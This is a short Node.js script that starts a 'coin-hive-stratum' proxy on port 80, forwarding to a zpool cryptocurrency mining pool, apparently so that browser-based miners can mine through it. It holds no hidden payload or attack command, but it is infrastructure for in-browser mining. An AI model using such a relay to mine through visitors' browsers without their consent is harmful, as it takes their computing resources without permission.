const Proxy = require("coin-hive-stratum");
const proxy = new Proxy({
  host: "power2b.na.mine.zpool.ca",
  port: 6242
});

proxy.listen(80);
